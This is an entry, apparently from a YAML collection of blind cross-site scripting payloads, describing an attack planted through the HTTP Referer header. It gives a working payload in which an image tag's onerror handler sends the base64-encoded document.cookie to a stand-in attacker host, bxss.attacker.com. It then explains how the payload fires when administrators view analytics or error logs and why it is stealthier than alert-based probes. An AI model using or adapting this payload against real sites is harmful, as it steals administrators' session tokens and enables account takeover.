  - id: xss-blind-010
    title: Blind XSS via img-src canary in referer header
    payload_string: '><img src=x onerror="fetch(''https://bxss.attacker.com/?c=''+btoa(document.cookie))">'
    how_it_works: 'The Referer header is often stored in web analytics, CDN access logs, or error-reporting dashboards, and
      may be rendered without proper encoding in administrative interfaces. Injecting an img-src canary with an onerror handler
      causes the payload to execute when an administrator views the access log or error report. Using btoa() encodes the cookie
      value for reliable HTTP transport, allowing the attacker to exfiltrate session tokens even when special characters are
      present. This approach is stealthier than alert()-based probes because it silently beacons rather than creating visible
      side effects.

      '
    prerequisites:
